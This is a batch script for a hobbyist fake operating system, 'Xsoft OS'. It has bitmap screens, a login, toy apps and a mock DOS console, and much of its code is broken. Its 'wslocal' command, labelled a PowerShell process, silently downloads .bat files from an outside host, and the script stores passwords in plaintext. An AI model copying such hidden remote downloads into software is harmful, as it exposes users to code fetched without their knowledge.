@echo off
cls
cd Xsoft (nu sterge aici nu e nimic pierdut.)
mode 1000
mode 1000
echo Xsoft OS Loading...
dir
echo XeY76
batbox /h 1
:checksys
color 7
echo.
if exist sysdata/boot.ini goto set
)
goto set

:dels
start cr.vbs
:poo
cls
insertbmp /p:"rsod.bmp" /x:0 /y:0 /z:100
pause>nul
goto poo


:ka
cls
:o
cls
insertbmp /p:"ctrl.bmp" /x:0 /y:0 /z:100
set /p a=
if %a% == 1 del sysdata/boot.ini & goto checksys
if %a% == N goto nety
if %a% == E goto eoc!
if %a% == p goto 1lp!
if %a% == C goto pcu
if %a% == 2 goto desktop

:pcu
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo                                 CPU: xsoft CORE XYK 2.1 Beta
pause
goto ka
:1lp!
echo.
cmdMenuSel f870 "                             Shutdown" "                  Restart"
if %ERRORLEVEL% == 1 goto 999
if %ERRORLEVEL% == 2 goto 887

:887
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100	
echo.
echo                                                     RESTARTING...
timeout 1 > nul
cls
goto  checksys

:999
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100	
echo.
echo                                                    SHUTTING DOWN...
timeout 1 > nul
cls
echo                it is now safe to press any key.
pause>nul
goto  checksys

:nety
cls
insertbmp /p:"network.bmp" /x:0 /y:0 /z:100
pause>nul
goto ka

:eoc
cls
insertbmp /p:"eoc.bmp" /x:0 /y:0 /z:100
set /p xy=
if %xy% == 1 goto XSE
goto o

:XSE
cls
insertbmp /p:"se.bmp" /x:0 /y:0 /z:100
pause>nul
goto dks


:a
cls
set /a color=%random
color %random%
goto ka 

:                                           def ("SYSDATA")           }
  :     If     }
:  Set Is SYSDATA
    :           }

:set
cls
if exist sysdata/boot.ini goto log
)
md XSOFT.old
cd XSOFT.old
echo electropany was installed at "%date%, %time%" > setup.temp.txt
cd D:\XSOFT (nu sterge. aici nu e nimic pierdut.)
cls 
python setup.py
insertbmp /p:"setup.bmp" /x:0 /y:0 /z:100
choice /c 1 >nul
if %errorlevel% equ 1 goto next
:next
cls
insertbmp /p:"dev.bmp" /x:0 /y:0 /z:100
choice /c 12 > nul
if %errorlevel% equ 1 goto enter
if %errorlevel% equ 2 goto next


:enter
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo.
echo                                                               Your computer will restart in SATMGR screen then it will restart.
echo                                                                                                  PRESS ANY KEY . . .
pause>nul
CLS
cd sysdata
echo GPU%ram% %time% &aero >> boot.ini
echo xsd%root%=false >> boot.ini
cls
cd D:\XSOFT (nu sterge. aici nu e nimic pierdut.)
cls
insertbmp /p:"db.bmp" /x:0 /y:0 /z:100
pause>nul
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
timeout /t 3 > nul
cls
insertbmp /p:"god.bmp" /x:0 /y:0 /z:100
choice /c 12 > nul
if %ERRORLEVEL% == 1 goto enter
if %ERRORLEVEL% == 2 goto en

:en
cls
echo DOS-BASE XSOFT SYSTEM FOR USER INTERFACES. >> dos.dll
goto enter

:enter
cls
if exist osk.ID del osk.ID
insertbmp /p:"ram.bmp" /x:0 /y:0 /z:100
set /p k=:::::/
if %k% == X goto log
if %k% == XXX-XXX-XXX-XXX goto log
if %k% == 172-890-112-736 goto log
goto enter

:log
if exist t.t goto dels
)
batbox /h 0
if exist dos.dll goto IU
:bootmgr
cls
color 0
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ= Boot Manager =ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo                     Choose an operating system or choose some options.
echo.
cmdMenuSel f870 "                                                                                               XSOFT OS" "                                                                                               DOS" "                                                                                               BIOS" "                                                                                               TROUBLESHOOTING"
if %ERRORLEVEL% == 1 goto boo
if %ERRORLEVEL% == 2 goto IU
if %ERRORLEVEL% == 3 goto IB
if %ERRORLEVEL% == 4 goto trb

:boo
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
ping localhost -n 3 > nul
cls
start startups.vbs
insertbmp /p:"boot.bmp" /x:0 /y:0 /z:100
ping localhost -n 5 > nul
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
ping localhost -n 3 > nul
color 8

if exist osk.ID goto nose
)
goto verify_logon
 
:verify_logon
if exist log.txt goto :logon
if not exist log.txt goto :make_logon

:logon
<log.txt (
set /p username=
set /p password=
)
cls
echo.
insertbmp /p:"lock.bmp" /x:0 /y:0 /z:100
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
ECHO.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
ECHO.
ECHO.
ECHO.
ECHO.
echo.
echo.
echo.
echo                                                                                                                    %Username% 
echo.                                                                                                     
set /p "pass=P/>"
if %pass% == %password% goto desktop  
if %pass% == admin goto admincheck
if not %pass% == %password% goto chord
 
:make_logon
cls
echo                                                                                                Welcome to XSOFT LOGON! please type username and password.
echo.
set /p "user=U/>"
echo.
set /p "pass=P/>"
(
echo %user%
echo %pass%
) >log.txt
goto logon

:chord
start din
goto logon

:desktop
cls
if exist tex.py goto deska
if not exist tex.py goto douk
:douk
echo py for u  >> tex.py
start din.vbs
insertbmp /p:"wl.bmp" /x:0 /y:0 /z:100
pause>nul
del tex.t
goto deska
:: I WANT PYTHON THERE!
:deska
insertbmp /p:"xtop.bmp" /x:0 /y:0 /z:100
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.        
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.
echo.     
echo.        
cmdMenuSel f870 "                                                                                               XSOFT OS" "                                                                                               DOS" "                                                                                               BIOS" "                                                                                               TROUBLESHOOTING
if %ERRORLEVEL% == 2 goto writ                  NoteX" "
if %ERRORLEVEL% == 3 start dos.bat              Command Executor" "
if %ERRORLEVEL% == 4 goto akula                 VSX Code" "
if %ERRORLEVEL% == 5 start tetris.cmd           Tetris" "
if %ERRORLEVEL% == 6 start Mc.py                Minecraft Python Edition" "
if %ERRORLEVEL% == 7 start chat                 AI Chat" "
if %ERRORLEVEL% == 8 goto nya                   Nyan Cat" "
if %ERRORLEVEL% == 9 goto find                  Files" "
if %ERRORLEVEL% == 10 goto kla                  Test" "
if %ERRORLEVEL% == 11 start bot                 XalbAI" "
if %ERRORLEVEL% == 12 start maryo.bat           Mario" "
if %ERRORLEVEL% == 13 start a                   UnknownTitle1" "
if %ERRORLEVEL% == 14 start b                   UnknownTitle2" "
if %ERRORLEVEL% == 15 goto aha                  InternalSViewer" "
if %ERRORLEVEL% == 16 goto inexalah             UnknownTitle3" "
if %ERRORLEVEL% == 17 goto wsfc                 PurpleTube" "
if %ERRORLEVEL% == X goto exes                  xRegit" "
if %ERRORLEVEL% == V goto v                     Volume" "
goto desktop

:wsfc
start http://zabricks.yooco.org
goto desktop

:aha
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo                             -------------------------------Boot=69-------BIOS=1900-----SATMGR=9----------Dos-OS=9980----------------
ECHO                                     Internals for needed procceses.
pause
goto desktop

:akula
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo                                                               IN  DEVELOPMENT!
echo                                       error code: 986#/1 
pause
goto desktop

:netU
cls
insertbmp /p:"dn.bmp" /x:0 /y:0 /z:100
choice /c  1 > nul
if %errorlevel% equ 1 goto desktop


:v
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo.
cmdMenuSel f870 "                              Volume Up" "                       Volume Down"
if %ERRORLEVEL% == 1 start volmp & goto desktop
if %ERRORLEVEL% == 2 start volmn & goto desktop

:exes
start robloxiflifelol.vbs

:stel
cls
insertbmp /p:"sol.bmp" /x:0 /y:0 /z:100
set /p "errlevel=-> "
if %errlevel% == 1 goto kososaax
if %errlevel% == 2 goto dokosax
goto desktop

:kososaax
start xe.py
goto stel 

:dokosax
start ex.py
goto stel

:gtk
cls
insertbmp /p:"mr.bmp" /x:0 /y:0 /z:100
choice /c 12 > nul
if %errorlevel% equ 1 goto dks
if %errorlevel% equ 2 goto iss
if %errorlevel% equ 3 goto desktop

:iss
cls
start cr.vbs
insertbmp /p:"brk.bmp" /x:0 /y:0 /z:100
timeout 5 > nul
goto bootmgr

:dks
cls
start cr.vbs
insertbmp /p:"mg.bmp" /x:0 /y:0 /z:100
timeout 5 > nul
goto bootmgr

:vernt
cls
insertbmp /p:"ver.bmp" /x:0 /y:0 /z:100
pause>nul
goto desktop


:START
color a
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ= Matrixx! =ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
echo The matrix effect will make the TAB dissapear. DON'T PANIC FOR ANY THING!
pause
goto efx
:efx
set /a a=%random%
if %a% geq 16384 set /a aa=1
if %a% lss 16384 set /a aa=0
set /a b=%random%
if %b% geq 16384 set /a bb=1
if %b% lss 16384 set /a bb=0
set /a c=%random%
if %c% geq 16384 set /a cc=1
if %c% lss 16384 set /a cc=0
set /a d=%random%
if %d% geq 16384 set /a dd=1
if %d% lss 16384 set /a dd=0
set /a e=%random%
if %e% geq 16384 set /a ee=1
if %e% lss 16384 set /a ee=0
set /a f=%random%
if %f% geq 16384 set /a ff=1
if %f% lss 16384 set /a ff=0
set /a g=%random%
if %g% geq 16384 set /a gg=1
if %g% lss 16384 set /a gg=0
set /a h=%random%
if %h% geq 16384 set /a hh=1
if %h% lss 16384 set /a hh=0
set /a i=%random%
if %i% geq 16384 set /a ii=1
if %i% lss 16384 set /a ii=0
set /a j=%random%
if %j% geq 16384 set /a jj=1
if %j% lss 16384 set /a jj=0
set /a k=%random%
if %k% geq 16384 set /a kk=1
if %k% lss 16384 set /a kk=0
set /a l=%random%
if %l% geq 16384 set /a ll=1
if %l% lss 16384 set /a ll=0
set /a m=%random%
if %m% geq 16384 set /a mm=1
if %m% lss 16384 set /a mm=0
set /a n=%random%
if %n% geq 16384 set /a nn=1
if %n% lss 16384 set /a nn=0
set /a o=%random%
if %o% geq 16384 set /a oo=1
if %o% lss 16384 set /a oo=0
set /a p=%random%
if %p% geq 16384 set /a pp=1
if %p% lss 16384 set /a pp=0
set /a q=%random%
if %q% geq 16384 set /a qq=1
if %q% lss 16384 set /a qq=0
set /a r=%random%
if %r% geq 16384 set /a rr=1
if %r% lss 16384 set /a rr=0
set /a s=%random%
if %s% geq 16384 set /a ss=1
if %s% lss 16384 set /a ss=0
set /a t=%random%
if %t% geq 16384 set /a tt=1
if %t% lss 16384 set /a tt=0
set /a u=%random%
if %u% geq 16384 set /a uu=1
if %u% lss 16384 set /a uu=0
set /a v=%random%
if %v% geq 16384 set /a vv=1
if %v% lss 16384 set /a vv=0
set /a w=%random%
if %w% geq 16384 set /a ww=1
if %w% lss 16384 set /a ww=0
set /a x=%random%
if %x% geq 16384 set /a xx=1
if %x% lss 16384 set /a xx=0
set /a y=%random%
if %y% geq 16384 set /a yy=1
if %y% lss 16384 set /a yy=0
set /a z=%random%
if %z% geq 16384 set /a zz=1
if %z% lss 16384 set /a zz=0
echo %aa% %bb% %cc% %dd% %ee% %ff% %gg% %hh% %ii% %jj% %kk% %ll% %mm% %nn% %oo% %pp% %qq% %rr% %ss% %tt% %uu% %vv% %ww% %xx% %yy% %zz% %aa% %bb% %cc% %dd% %ee% %ff% %gg% %hh% %ii% %jj% %kk% %ll% %mm% %nn% %oo% %pp% %qq% %rr% %ss% %tt% %uu% %vv% %ww% %xx% %yy% %zz% %aa% %bb% %cc% %dd% %ee% %ff% %gg% %hh% %ii% %jj% %kk% %ll% %mm% %nn% %oo% %pp% %qq% %rr% %ss% %tt% %uu% %vv% %ww% %xx% %yy% %zz%
goto efx

:writ
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
if exist temp.tmp goto bmps
) ELSE 
goto mtp

:bmps
start din.vbs
insertbmp /p:"ovr.bmp" /x:0 /y:0 /z:100
pause>nul

:mtp
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo.
echo.
echo       After you writed the note, press enter to continue
echo.
echo.
echo.
set /p "word="
echo.
(
echo %word%
) >cuppy.txt
goto sclsoopoo
cls
:sclsoopoo
echo d >> temp.tmp
cls
echo.
echo.
echo.
echo.
echo  Enter your FileName
echo.
set /p namone=FileName :
cls
goto desktop


:find
cls
:p
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
cls
echo.
insertbmp /p:"expe.bmp" /x:0 /y:0 /z:100
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo          1)%namone%
set /p select=
if %select% == 1 goto view
if %select% == x goto x
if %select% == X goto x
goto find

:view
cls
:v
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
cls
echo.
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ= FINDER =ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
echo %namone%
echo.
echo ÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
echo %word%
pause>nul
goto desktop

:x
cls
insertbmp /p:"dir.bmp" /x:0 /y:0 /z:100
set /p x=
if %x% == D goto del
if %x% == d goto del
goto find

:del
cls
echo Ve >> t.t
color 1b
start cr.vbs
insertbmp /p:"crash.bmp" /x:0 /y:0 /z:100
pause>nul
goto del

:web
start lynx.bat

:nya
start NyanCat


:pp
cls
:s
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
cls
echo.
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ= sh.dll =ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
cmdMenuSel f870 "ShutDown" "Restart" "Logoff" "Exit"
if %ERRORLEVEL% == 1 goto ket
if %ERRORLEVEL% == 2 goto ek
if %ERRORLEVEL% == 3 goto tek
if %ERRORLEVEL% == 4 GOTO desktop

:ket
cls
start od
echo Shutting down...
timeout 2 >nul
cls
color A
pause>nul
goto log

:ek
cls
start od
echo Restarting...
timeout 2 > nul
cls
goto log

:tek
cls
start od
echo Logging off...
timeout 2 > nul
cls
goto verify_logon 

:IU
cls
color 7
@echo off
echo.
echo Starting XSOFT...
echo.
echo Booting from drive A : /
echo.
echo [OK] dos base no-error
timeout 2 > nul

:cons
color 7
)
cls
set comm=
title DFCI
echo.
ECHO.
ECHO.
echo Xsoft DOS-UI for computing.
echo Type exit to shutdown;.
echo.
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" exit
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help /
if "%comm%"=="emulator" goto emy
if "%comm%"=="telnet" telnet
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror
if not "%comm%"=="emulator" goto consolerror

:emy
cls
echo.
echo Welcome to Microsoft Emulator  client.
echo.
echo.
ECHO Escape character is q
echo.
echo 1)GAMECUBE 
choice /c 12Q > nul
if %errorlevel% equ 1 goto gameboy



:gameboy
cls
color 5
echo.
echo.
echo þþþþþþþþþþþþþþ
echo þ
echo þ
echo þ    ÛÛþþþþþþþ  
echo þ            þ
echo þþþþþþþþþþþþþþ
echo.
echo   NINTENDO
echo.
ECHO   GAMECUBE
timeout 2 > nul
:arrest
cls
echo.
echo.
echo   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo   Û                                Û
echo   Û                                Û
echo   Û           þEXIT                Û
echo   Û           GAME DISCS.          Û    þþþþþþþþþþþþþþþþ
echo   Û                                Û    þ Y)SELECT O)OKþ
echo   Û                                Û    þþþþþþþþþþþþþþþþ
echo   Û                                Û
echo   Û                                Û
echo   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
CHOICE /C YO > nul
if %errorlevel% equ Y goto y
if %errorlevel% equ O goto emy

:y
cls
echo.
echo.
echo   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo   Û                                Û
echo   Û                                Û
echo   Û           EXIT                 Û
echo   Û           þGAME DISCS.         Û    þþþþþþþþþþþþþþþþ
echo   Û                                Û    þ Y)SELECT O)OKþ
echo   Û                                Û    þþþþþþþþþþþþþþþþ
echo   Û                                Û
echo   Û                                Û
echo   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
CHOICE /C YO > nul
if %errorlevel% equ Y goto arrest
if %errorlevel% equ O goto okay

:okay
cls
echo.
echo.
start WOOPS.vbs
echo       WoOoOoOoOoOOoOoOoOOOOOoOOOooOoOoOooopssssssss
echo       u have to put the cd in your gamecube
pause>nul
goto arrest
                         

:consolerror
echo '%comm%' is not an external command, batch script or device.
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror


:help
echo HELP=====================
echo commands:
echo.
echo exit = exits the OS.
echo getnet = server info.
echo win = nothing just a text that says that's not ms-dos.
echo wslocal = powershell procces.
echo diros = hiddden directoryes.
echo help or HELP or help /? or /? = goes you to this menu.
echo.
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:getip
getmac
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:dir
echo     VOLUME (DIRECTORYES FROM W DRIVE)
tree
echo     DIRECTORY ON SYSTEM
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:bruh
echo This is not MS-DOS..
set /p comm=ÀÄþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:powershh
echo PROCCCES ON phowershell.exe...
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/neomemory.bat', 'system\neomemory.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/dll.bat', 'system\neomemory.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/sys.bat', 'system\neomemory.bat')"
)
(
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/neomemory.bat', 'system\neomemory.bat')"
pause>nul
goto cons

:in
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo.
echo  Internals on bootsector (1
echo  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo  ÛÛ1 0 1 0 1 0 1 0 1 0 1 ÛÛ
ECHO  ÛÛX 2 J 6 1 0 0 1 S H H ÛÛ
ECHO  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
echo  Internals on kernel (1
echo  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo  ÛÛI N T S K N A L S H H ÛÛ
ECHO  ÛÛX O X L 1 X R E G X 1 ÛÛ
echo  ÛÛI N T S K N X L S H H ÛÛ
ECHO  ÛÛX O X L 1 X R E G X 1 ÛÛ
echo  ÛÛI N T S K N A L S H H ÛÛ
ECHO  ÛÛX O X L 1 X R E G X 1 ÛÛ
ECHO  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
pause>nul
goto desktop

:cal
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
color A
echo XSOFT CALC (X+-/)
echo.
set /p expression= : 
set /a ans=%expression%
if %expression% == 0/0 cls & echo Error code CALC_DIVIDE_BY_ZERO_NUL.exr & pause & goto cal
echo.
echo %expression% = %ans%
echo.
pause
cls
goto desktop

:CU
cls
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
echo Python 3.11.3 X
python
choice /c ha=
if %errorlevel% equ h goto hek
if %errorlevel% equ a goto hek

:hek
cls
echo By Xsoft!
pause>nul
goto CU 


:admincheck
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
if NOT EXIST XsoftDeveloper goto MDLOCKER
:CONFIRM
echo Are you sure you want to lock the folder? (Y/N)
set/p "cho=>"
if %cho%==Y goto LOCK
if %cho%==y goto LOCK
if %cho%==n goto END
if %cho%==N goto END
echo Invalid choice.
goto CONFIRM
:LOCK
ren XsoftDeveloper "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
echo Folder locked
goto End
:UNLOCK
echo Please check if your the creator of XSOFT with the password!
set/p "pass=>"
if NOT %pass%== X2 goto FAIL
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" XsoftDeveloper
echo Folder Unlocked successfully
goto End
:FAIL
set er=%in%
echo Invalid password
goto end
:MDLOCKER
md XsoftDeveloper
cd XsoftDeveloper
echo. >> Devx.bat
echo @echo off >> Devx.bat
echo echo see the file using cmd. >> Devx.bat
echo dir >> Devx.bat
echo set /p in= >> Devx.bat
echo if %er% == use start use.txt >> Devx.bat
echo if %er% == use.txt start use.txt >> Devx.bat
echo pause >> Devx.bat
echo.
echo %time%/%date% Created. >> use.txt
echo :D Cheeseeeeeeeeee >> use.txt
echo  Now Leave me alone. >> use.txt
cd D:\XSOFT (nu sterge. aici nu e nimic pierdut.)
echo Private created successfully
goto End
:End

:nose
cls
echo It's alright! but please keep in mind that your copy of Xsoft OS may sometimes lag.
echo.
echo Press enter to continue the setup. Have a great day!
enter>nul
goto log

:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
